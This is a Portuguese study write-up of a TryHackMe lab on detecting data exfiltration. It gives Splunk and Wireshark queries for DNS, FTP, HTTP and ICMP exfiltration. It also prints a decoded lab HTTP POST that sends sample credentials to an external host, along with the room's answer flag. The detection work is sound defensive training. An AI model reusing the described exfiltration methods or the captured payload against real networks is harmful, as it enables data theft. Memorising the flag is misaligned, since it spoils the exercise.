link para a sala: https://tryhackme.com/room/dataexfildetection

É o roubo de dados de uma organização para fora dela, sem autorização. Pode acontecer por funcionário mal-intencionado ou por invasores (malware, credenciais roubadas, etc.)

Os motivos para a o roubo de dados podem ser vários como: benefício monetário (para venda de dados ou fraude), espionagem (obtenção de segredos), extorsão (roubo e ameaçar vazar), sabotagem (formas de prejudicar uma empresa) e preparação para ataques futuros.

Os agentes de ameaça alcançam isso através do protocolo HTTP e HTTPS para esconder o tráfego, para enviar comandos através de ataques C2, em uploads para nuvens, até mesmo em ataques ransomware antes de criptografar os dados. 

O ataque inicia com a escolha dos dados alvos, preparação de estratégias e ferramentas. Durante o ataque, ocorre o roubo dos dados que é a transferência via rede, tudo coordenado via C2.

As principais técnicas utilizadas por agentes de ameaça incluem transferência por rede, em que um atacante utiliza meios comuns como HTTPS - que é criptografada o que dificulta a identificação, FTP, SFTP, SCP - que são transferências comuns, porém suspeitas quando ocorrem para fora da rede e DNS tunelling em que o agente de ameaça esconde dados dentro das requisições DNS. Transferência por host, como por processos comuns de shells para baixar os dados com wget, curl, entre outros; processos de compactação de arquivos com zip/rar a fim de não chamar atenção para quantidade de arquivos e, em outros casos, a utilização de mídias removíveis como USB. 

Atualmente um dos meios mais utilizados pelos atacantes é a nuvem já que está em uso em praticamente todas as organizações. Dessa forma, é mais difícil ser identificado com base no comportamento dos usuários, por exemplo. Outra técnica bastante utilizada é a ocultação por encoding, transformando dados em texto normal, por exemplo, esteganografia, uma técnica de ocultar dados em imagens e vídeos, além de transferir dados de forma lenta e em poucas quantidades. Por fim, ferramentas legítimas utilizadas dentro de uma organização em que um comportamento pode não ser considerado suspeito já que pode acontecer no dia-a-dia de uma empresa.

Portanto é necessário questionar a origem dos dados, qual o destino, o volume transferido e a frequência e se é válida a transferência daqueles dados naquele momento e para tal destino.

# Análise de transferência por DNS

O DNS é uma boa técnica porque são muito utilizados, principalmente em requisições externas, portanto não há tanta desconfiança quanto à sua atividade.

Indicadores de um ataque DNS são: muitas requisições, principalmente de arquivos TXT ou vazios - NULL de forma repetitiva e apresentando um padrão; domínios ou subdomínios muito longos e strings sem sentido. 

Analisando os seguintes arquivos: data_exfil.pcap e [dns_exfil](dns_exfil.txt)
Analisando os arquivos é possível identificar um subdomínio super aleatório, com strings diferentes a cada requisição, além de um mesmo domínio “tunnelcorp.net” como destino. Dessa forma, é possível concluir que vários hosts internos foram comprometidos pois agem como fonte de dados.

Utilizando o splunk, é possível conferir as queries do tipo dns com o seguinte comando:

`index=data_exfil sourcetype=DNS_logs labels="suspicious" 
//esse comando identifica as requisições classificadas como suspeitas`

Para identificar de acordo com estatísticas adiciona um pipe com “stats”, como em:

`index="data_exfil" sourcetype="DNS_logs" | stats count by src_ip
//filtrando por endereço IP de origem, relacionando a quantidade de requisições feitas por cada endereço IP`

FIltrando com base nas queries e definindo a frequência: 

`index="data_exfil" sourcetype="dns_logs" | stats count by query | sort -count
//conta a quantidade de queries`

Analisando os resultados, é possível afirmar que alguns endereços ip de origem possuem mais requisições do que o normal.

Além disso, também é possível conferir o tamanho das requisições enviadas com:
`index="data_exfil" sourcetype="DNS_logs" | where len(query) > 30`

Como conclusão: a maior quantidade de requisições suspeitas feitas por um endereço IP foi 315, o endereço → 192.168.1.103

# Análise de transferência por FTP

FTP permite transferir grandes quantidades de dados e agentes de ameaça podem se aproveitar de sistemas mal configurados ou credenciais expostas, se infiltram em tráfego legítimo em servidores legítimos e utilizam portas pouca usadas.

Indicadores de exfiltração por FTP: utilização de palavras como USER e PASS, conexões com endereços IP desconhecidos e conexões com portas efêmeras (portas temporárias abertas para uma conexão específica entre dispositivos), além do tipo de transferência STOR (upload) ou RETR (download).

Procurando conexões FTP:
`ftp || ftp-data`
Para filtrar por strings específicas, como credenciais, utiliza-se a comparação:
`ftp.request.command == "USER" || ftp.request.command == "PASS
//ou
ftp contains "string"`
Para uma investigação mais profunda no pacote, podemos analisar o conteúdo do payload ftp através de tcp stream. Também é interessante filtrar pelo tipo de arquivo transferido que podem conter os dados exfiltrados.

Filtrando pelo tamanho do pacote:
`ftp && frame.len > tamanho`

# Análise de transferência por HTTP
Outro método comum é por tráfego HTTP já que é muito utilizado também, pode ser ignorado por firewalls e pode ser obfuscado. Dessa forma, os dados são enviados via post. Os agentes de ameaça também utilizam as técnicas de comprimir dados em pacotes menores (encoded data) ou os criptografa, além de utilizar serviços legítimos como disfarce.

Evidências comuns de exfiltração com HTTP são: grandes quantidades de dados enviados via POST para destinos desconhecidos ou de baixa reputação, assim como as transferências frequentes de pequenos e depois grandes pacotes. 

Análise no splunk:

Filtrando dados http via POST já que exfiltração acontece por esse método:
`index="data_exfil" sourcetype="http_logs" method="POST"` É possível tirar algumas conclusões sobre o host de destino, os endereços IP utilizados, mas investigação profunda ainda é recomendada

O que retorna:  Complete 3,075 events (before 3/27/26 1:52:09.000 PM), 3075 eventos

Para filtrar por quantidade de byte enviados:
`index="data_exfil" sourcetype="http_logs" method=POST | stats count avg(bytes_sent) max(bytes_sent) min(bytes_sent) by domain | sort - count`Que permite visualizar os dados pela média de bytes, máximo ou mínimo por domínio, podendo ser personalizado

Investigando os domínios com maior volume de bytes enviados, é possível identificar que o host responsável pelos grandes payloads foi o endereço IP192.168.1.103, utilizando o URI: /v1/sync/upload; 

Essa URI indica uma API versionada (v1), relacionada à sincronização de dados (sync) e envio dados ou arquivos (upload) para o endereço de destino: 185.203.119.12, um endereço público, associado ao domínio api.cloudsync-services.com.
> Endereços nas faixas de 10.x.x.x    172.16.x.x - 172.31.x.x e 192.168.x.x são privados

Isso sugere o envio de dados de uma organização privada para um servidor externo, possivelmente caracterizando uma operação de upload para um serviço remoto.

Análise no wireshark:

Procurando apenas por requests via POST:
`http && http.request.method=="POST"`

Também identifico a URI que envia dados para um servidor público: 
![imagem](SOC/imagens/image.png)
Investigando os resultados, é possível identificar as requisições HTTP destinadas aos seguintes hosts:

`http://metrics.dev/v1/sync/upload
http://dropbox.com/v1/sync/upload -> 500 bytes
http://api.cloudsync-services.com/v1/sync/upload -> 750 bytes
//domínio aparentemente legítimo, porém comportamento fora do padrão esperado`

Ao inspecionar o conteúdo do payload e realizar a decodificação de hexadecimal para texto, foi possível identificar informações sensíveis sendo transmitidas em texto claro, incluindo:

- Credenciais de acesso (usuário e senha)
- Informações de VPN
- Dados de conexão com banco de dados
- Hashes de arquivos

Além disso, o conteúdo inclui evidências explícitas de atividade suspeita, como “Suspicious HTTP POST traffic observed from 10.10.10.104”. Esses achados indicam fortemente a ocorrência de **exfiltração de dados**, onde informações sensíveis estão sendo enviadas de um host interno para um servidor externo através de requisições HTTP POST.

`504f5354202f76312f73796e632f75706c6f616420485454502f312e310d0a486f73743a206170692e636c6f756473796e632d73657276696365732e636f6d0d0a436f6e74656e742d4c656e6774683a203635340d0a0d0a2320496e7465726e616c204163636573732043726564656e7469616c73202d2046696e616e6365204465706172746d656e740d0a557365726e616d653a2066696e616e63655f61646d696e0d0a50617373776f72643a2046216e406e633323323032350d0a56504e20476174657761793a2076706e2e636f72706e65742e6c6f63616c0d0a535348204b65792046696e6765727072696e743a205348413235363a39663a33613a32623a37633a31643a38653a34663a61613a62623a63633a64643a65653a66663a30303a31313a32320d0a446174616261736520436f6e6e656374696f6e3a0d0a2020486f73743a20646230312e696e7465726e616c2e636f72700d0a2020506f72743a20353433320d0a2020557365723a2064625f7265616465720d0a202050617373776f72643a2052334064306e6c7921323032350d0a2d2d2d0d0a496e636964656e7420526573706f6e7365204e6f7465732028436f6e666964656e7469616c290d0a2d20537573706963696f7573204854545020504f53542074726166666963206f627365727665642066726f6d2031302e31302e31302e3130340d0a2d205061796c6f61647320636f6e7461696e2072617720706c61696e74657874206368756e6b730d0a2d2d2d0d0a5472794861636b4d6520466c61673a0d0a54484d7b687474705f7261775f337866316c7472347431306e5f737563633373737d0d0a2d2d2d0d0a46696c65204861736865733a0d0a20207365637265742e7478743a2039633866336532623761316434653566366337623861396430653166326133620d0a20206261636b75702e7461722e677a3a2037663665356434633362326131393038613762366335643465336632613162300d0a2320456e64206f662066696c65`

`POST /v1/sync/upload HTTP/1.1
Host: api.cloudsync-services.com
Content-Length: 654

# Internal Access Credentials - Finance Department
Username: finance_admin
Password: F!n@nc3#2025
VPN Gateway: vpn.corpnet.local
SSH Key Fingerprint: SHA256:9f:3a:2b:7c:1d:8e:4f:aa:bb:cc:dd:ee:ff:00:11:22
Database Connection:
  Host: db01.internal.corp
  Port: 5432
  User: db_reader
  Password: R3@d0nly!2025
---
Incident Response Notes (Confidential)
- Suspicious HTTP POST traffic observed from 10.10.10.104
- Payloads contain raw plaintext chunks
---
TryHackMe Flag:
THM{http_raw_3xf1ltr4t10n_succ3ss}
---
File Hashes:
  secret.txt: 9c8f3e2b7a1d4e5f6c7b8a9d0e1f2a3b
  backup.tar.gz: 7f6e5d4c3b2a1908a7b6c5d4e3f2a1b0
# End of file`

# Análise de transferência por ICMP
ICMP é um protocolo de rede utilizado para relatório de rede e controle. ICMP frequentemente é menos inspecionado que TCP/HTTP, o que pode ser explorado para tunelização e exfiltração.

As técnicas mais comuns são: ICMP echo (type 8) / reply (type 0) tunneling que consistem em payloads criptografados que são coletados pelo servidor; ICMP customizado ou de diferentes tipos para evitar a detecção por firewalls baseados em assinatura; fragmentação de payloads; codificação com base64 para aparentar dados comuns.

Para identificar exfiltração por ICMP é preciso observar sessões ICMP persistentes em hosts desconhecidos; tamanho anormal do payload; pacotes com entropia alta (se trata da aleatoriedade dos dados) que indica malware compactado e requisições ICMP que não estão relacionadas a nenhum serviço no mesmo host.

Análise via wireshark:

De acordo com os resultados, há muitas requisições ICMP vindas de 3 hosts diferentes: 192.168.1.101, 192.168.1.103 e 192.168.1.104 em que a resposta está sem payload relevante, apresentando padrão inconsistente com ping normal, para uma faixa de endereços destino: 192.168.1.1, 192.168.1.2 e 192.168.1.3, além de 10.0.0.254 em um período regular de tempo, possivelmente automatização. O que pode indicar movimento lateral, C2 interno, pivoting dentro da rede.

Os pacotes enviados por 10.0.0.254 contém credenciais não criptografadas:
`646230312e696e7465726e616c2e636f72700d0a2020506f72743a20353433320d0a2020557365723a2064625f7265616465720d0a202050617373776f72643a2052334064306e6c7921323032350d0a2d2d2d0d0a496e636964656e7420526573706f6e7365204e6f7465732028436f6e666964656e7469`

`Odb01.internal.corp
  Port: 5432
  User: db_reader
  Password: R3@d0nly!2025
---
Incident Response Notes (Confidenti`

Também é possível filtrar pelo tipo de ICMP, sendo que requests é código 8, o tamanho da request maior que 100, em que o comum é em torno de 74 bytes:

`icmp && icmp.type == 8 && frame.len > 100`
